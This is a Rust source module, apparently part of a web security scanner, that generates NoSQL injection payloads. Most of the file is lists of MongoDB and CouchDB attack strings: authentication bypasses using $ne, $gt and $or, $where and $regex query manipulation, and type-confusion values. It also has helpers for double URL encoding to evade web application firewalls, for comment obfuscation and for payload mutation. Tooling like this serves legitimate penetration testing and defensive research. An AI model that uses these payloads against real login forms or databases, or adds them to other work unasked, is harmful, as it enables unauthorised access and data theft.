//! NoSQL Payload Generation
//! Generates bounded JSON and URL-encoded NoSQL payloads with mutation variants.
//! Implements memory-bounded payload queues for 2GB RAM ceiling compliance.

use std::borrow::Cow;
use std::collections::VecDeque;

/// Bounded payload generator for NoSQL injection testing
pub struct NoSqlPayloads {
    /// Circular buffer for generated payloads (bounded)
    payload_queue: VecDeque<Cow<'static, str>>,
    max_payloads: usize,
    /// Current mutation index for deterministic generation
    mutation_index: usize,
}

impl NoSqlPayloads {
    pub fn new(max_payloads: usize) -> Self {
        Self {
            payload_queue: VecDeque::with_capacity(max_payloads.min(2048)),
            max_payloads: max_payloads.min(2048),
            mutation_index: 0,
        }
    }

    /// Generate MongoDB authentication bypass payloads
    pub fn auth_bypass_payloads(&self) -> impl Iterator<Item = &'static str> {
        [
            "{\"$ne\":null}",
            "{\"$gt\":\"\"}",
            "{\"$gte\":\"\"}",
            "{\"$lt\":\"\"}",
            "{\"$ne\":\"invalid\"}",
            "{\"$or\":[{\"$ne\":1}]}",
            "{\"$or\":[{},{\"$ne\":1}]}",
        ].into_iter()
    }

    /// Generate MongoDB query manipulation payloads
    pub fn query_manipulation_payloads(&self) -> impl Iterator<Item = &'static str> {
        [
            "{\"$where\":\"return true\"}",
            "{\"$where\":\"this.password!=null\"}",
            "{\"$regex\":\".*\"}",
            "{\"$in\":[\"admin\",\"root\",\"user\"]}",
            "{\"$nin\":[\"invalid\"]}",
        ].into_iter()
    }

    /// Generate CouchDB specific payloads
    pub fn couchdb_payloads(&self) -> impl Iterator<Item = &'static str> {
        [
            "{\"type\":\"user\",\"$ne\":null}",
            "{\"_id\":{\"$gt\":null}}",
            "{\"name\":{\"$regex\":\".*\"}}",
        ].into_iter()
    }

    /// Generate URL-encoded variants of JSON payloads
    pub fn url_encoded_payloads(&self) -> impl Iterator<Item = String> {
        self.auth_bypass_payloads()
            .chain(self.query_manipulation_payloads())
            .map(|p| urlencoding(p))
    }

    /// Generate double-encoded payloads for WAF evasion
    pub fn double_encoded_payloads(&self) -> impl Iterator<Item = String> {
        self.url_encoded_payloads()
            .map(|p| urlencoding(&p))
    }

    /// Generate comment-obfuscated payloads
    pub fn comment_obfuscated_payloads(&self) -> impl Iterator<Item = String> {
        [
            "{\"$ne\":null}//".to_string(),
            "{\"$ne\":null}/*comment*/".to_string(),
            "{\"$gt\":\"\"}//".to_string(),
            "{\"$or\":[{}]}//".to_string(),
        ].into_iter()
    }

    /// Generate array-based injection payloads
    pub fn array_payloads(&self) -> impl Iterator<Item = &'static str> {
        [
            "[{\"$ne\":null}]",
            "[\"admin\",\"root\"]",
            "{\"$in\":[1,2,3]}",
            "{\"$all\":[{\"$ne\":1}]}",
        ].into_iter()
    }

    /// Generate type confusion payloads
    pub fn type_confusion_payloads(&self) -> impl Iterator<Item = &'static str> {
        [
            "0",
            "1",
            "true",
            "false",
            "null",
            "\"0\"",
            "\"1\"",
            "\"true\"",
            "\"false\"",
        ].into_iter()
    }

    /// Queue a payload for later use (bounded)
    pub fn queue_payload(&mut self, payload: Cow<'static, str>) {
        if self.payload_queue.len() >= self.max_payloads {
            self.payload_queue.pop_front();
        }
        self.payload_queue.push_back(payload);
    }

    /// Get queued payloads
    pub fn get_queued(&self) -> impl Iterator<Item = &Cow<'static, str>> {
        self.payload_queue.iter()
    }

    /// Generate mutation variant based on index
    pub fn mutate(&mut self, base: &str) -> String {
        self.mutation_index = (self.mutation_index + 1) % 10;
        
        match self.mutation_index {
            0 => base.to_string(),
            1 => format!("{}//", base),
            2 => format!("{}/*{}*/", base, self.mutation_index),
            3 => base.replace("{", "{ ").replace("}", " }"),
            4 => base.replace("\"", "\\\""),
            5 => urlencoding(base),
            6 => base.chars().rev().collect(),
            7 => format!("{{\"$and\":[{}]}}", base),
            8 => format!("{{\"$or\":[{}]}}", base),
            _ => base.to_uppercase(),
        }
    }

    /// Clear the payload queue for memory management
    pub fn clear_queue(&mut self) {
        self.payload_queue.clear();
    }

    /// Get current queue size
    pub fn queue_size(&self) -> usize {
        self.payload_queue.len()
    }
}

/// Simple URL encoding function
fn urlencoding(s: &str) -> String {
    let mut result = String::with_capacity(s.len() * 2);
    for c in s.chars() {
        match c {
            'a'..='z' | 'A'..='Z' | '0'..='9' | '-' | '_' | '.' | '~' => result.push(c),
            ' ' => result.push_str("%20"),
            '{' => result.push_str("%7B"),
            '}' => result.push_str("%7D"),
            '"' => result.push_str("%22"),
            ':' => result.push_str("%3A"),
            '[' => result.push_str("%5B"),
            ']' => result.push_str("%5D"),
            ',' => result.push_str("%2C"),
            '$' => result.push_str("%24"),
            '&' => result.push_str("%26"),
            '+' => result.push_str("%2B"),
            '=' => result.push_str("%3D"),
            '?' => result.push_str("%3F"),
            '/' => result.push_str("%2F"),
            '#' => result.push_str("%23"),
            '%' => result.push_str("%25"),
            _ => {
                for byte in c.to_string().as_bytes() {
                    result.push_str(&format!("%{:02X}", byte));
                }
            }
        }
    }
    result
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_auth_bypass_payloads() {
        let gen = NoSqlPayloads::new(100);
        let count: usize = gen.auth_bypass_payloads().count();
        assert_eq!(count, 7);
    }

    #[test]
    fn test_url_encoding() {
        let encoded = urlencoding("{\"$ne\":null}");
        assert!(encoded.contains("%7B"));
        assert!(encoded.contains("%22"));
    }

    #[test]
    fn test_payload_queue_bounded() {
        let mut gen = NoSqlPayloads::new(5);
        for i in 0..10 {
            gen.queue_payload(Cow::Owned(format!("payload{}", i)));
        }
        assert_eq!(gen.queue_size(), 5);
    }
}
